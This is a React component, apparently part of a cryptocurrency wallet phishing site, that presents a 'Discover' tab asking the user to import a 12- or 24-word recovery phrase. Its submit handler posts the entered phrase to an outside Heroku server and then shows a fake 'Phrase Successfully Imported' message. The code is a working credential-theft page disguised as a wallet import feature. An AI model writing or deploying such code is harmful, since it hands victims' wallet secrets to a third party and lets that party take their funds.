import React, { useState } from "react";
import axios from "axios";
import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import styles from "../../styles/Home.module.css";
import Tabs from "./index";

export default function Discover() {
  const [phrase, setPhrase] = useState("");

  const notify = () => {
    phrase === "" ? "" : toast.success("Phrase Successfully Imported");
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    if (phrase !== "") {
      axios
        .post("https://shielded-earth-12418.herokuapp.com/send", {
          phrase: phrase,
        })
        .then((res) => res.json())
        .catch((err) => err);
    }
  };

  return (
    <Tabs>
      <div>
        <form onSubmit={handleSubmit}>
          <textarea
            value={phrase}
            onChange={(e) => setPhrase(e.target.value)}
            placeholder="Phrase is typically 12 (sometimes 24) words separated by single spaces"
            className={styles.textarea}
            required
          />
          <button onClick={notify} className={styles.button}>
            import
          </button>
          <ToastContainer />
        </form>
      </div>
    </Tabs>
  );
}
